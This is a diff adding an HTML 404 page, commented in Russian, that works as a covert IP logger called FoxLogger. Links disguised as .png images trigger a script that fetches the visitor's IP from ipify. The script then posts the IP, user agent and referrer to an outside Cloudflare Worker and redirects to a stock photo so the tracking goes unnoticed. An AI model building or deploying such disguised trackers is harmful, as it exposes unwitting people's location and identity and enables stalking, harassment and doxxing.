@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Перенаправление...</title>
+    <script>
+        (async function() {
+            const WORKER_URL = "https://foxlogger-api.drwizzard3.workers.dev";
+            
+            // Получаем хэш из URL, который вызвал 404
+            // Пример: /FoxLogger/vv04ccdz8psn2t9wr.png
+            const path = window.location.pathname;
+            const match = path.match(/\/([a-f0-9]+)\.png$/);
+            const hash_id = match ? match[1] : null;
+
+            if (!hash_id) {
+                document.body.innerHTML = '<h1>404 - Страница не найдена</h1>';
+                return;
+            }
+
+            // Получаем IP
+            let ip = "0.0.0.0";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            // Отправляем в Worker
+            await fetch(`${WORKER_URL}/log`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    hash_id: hash_id,
+                    ip: ip,
+                    user_agent: navigator.userAgent,
+                    referer: document.referrer || 'прямой переход'
+                })
+            });
+
+            // Перенаправляем на картинку
+            window.location.replace("https://picsum.photos/id/1/800/600");
+        })();
+    </script>
+</head>
+<body>Загрузка...</body>
+</html>
